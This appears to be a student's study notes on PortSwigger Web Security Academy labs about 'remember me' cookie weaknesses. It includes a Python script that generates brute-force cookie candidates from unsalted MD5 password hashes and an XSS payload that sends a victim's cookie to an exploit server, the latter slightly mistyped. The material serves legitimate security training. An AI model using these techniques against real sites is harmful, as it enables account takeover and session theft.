
---

## Keeping Users Logged-In

A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like Remember me. 

This functionality is often implemented by creating a remember me token, which is then stored in a persistent cookie. A user possessing this cookie effectively allows him/her to bypass the entire login process, it is best practice for this cookie to be impossible to guess. However, some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. Some even use the password as part of the cookie. This approach is particularity dangerous if an attacker is able to create their own account because they can study their own cookie and know how it is being generated. Once they know the formula, they can try to brute-force other user's cookies.

Some websites assume that if the cookie is encrypted in some way it will not be guessable even if it does use static values. While this may be true if done correctly, naively "encrypting" the cookie using a simple two-way encoding like Base64 offers no protection whatsoever. Even using proper encryption with a one-way hash function is not completely bulletproof. If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists. This method can be used to bypass login attempt limits if a similar limit isn't applied to cookie guesses.

Even if the attacker can't create their own account, they may still be able to exploit this vulnerability. Using techniques such as XSS, an attacker could steal another user's remember me cookie and know how the cookie is being generated. If the website was built using an open-source framework, the key details of the cookie construction may even been publicly documented.

---

## LAB (Brute-forcing a stay-logged-in cookie)

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his **My account** page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, we need to first login with our user's credentials and capture the remember me or keep me logged-in cookie. If we try to decode it by using Base64, we will find that the cookie value starts with our username next to ":", like so: wiener:. The string next to this is in fact our password encoded using MD5 hash. Now, since we know how the cookie is being created, we can struct the remember me cookie for our victim. First we need to hash the list of passwords that we are given using MD5. Next, we will concatenate  the hash with the username of our victim. Finally, we will encode the whole thing using Base64. 

We can do that by Python scripting: 
```
import hashlib
import base64

#read the file of passwords and turn into md5 hash
cookie_key="carlos:"
hashes=[]
with open ('passwords.txt','r') as file:
	for password in file:
		password=password.strip()
		md5_hash=hashlib.md5(password.encode()).hexdigest()
		hashes.append(md5_hash)
		

#create the cookie for carlos
for h in hashes:

	cookie=cookie_key+h

	#Convert the string into bytes and encode it

	encoded_cookie=base64.b64encode(cookie.encode('utf-8'))

	#Turn the bytes into a normal string:
	cookie=encoded_cookie.decode("utf-8")

	print (cookie)

```

This will allow us to brute-force the value of the cookie.

In the request that we captured that contains the cookie value, we will remove the session value and replace the username with carlos and put a payload placement for the cookie value. We will eventually get a successful login.

---

In rare cases, it may be possible to obtain a user's actual password in clear text from a cookie, even if it is hashed. If the hash of the password was not salted, it is easy to search for the clear text of the hash.

---

## LAB (Offline password cracking)

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

This is a XSS vulnerable lab. To solve this lab, we first need to login using our user credentials. Then, we will click on the go to exploit server. This page will have the url of the location we will direct the info of the target which includes their remember me cookie value. 

We will first test if the website is vulnerable to XSS. To do this, we will run this payload on a comment for any of the posts: `<script>alert(1)</script>` If we posted this comment and refreshed the page, we will get an alert. This shows that the website is vulnerable to XSS attacks.

To get our target's remember me cookie value, we will post this payload as a comment: `<script>document.location'(exploit server URL)'+docment.cookie</script>`

After we post this as a comment, we will go to the exploit server and we click on Access log. We will get the remember me cookie value. We will get the password the same way we got it from the last lab.


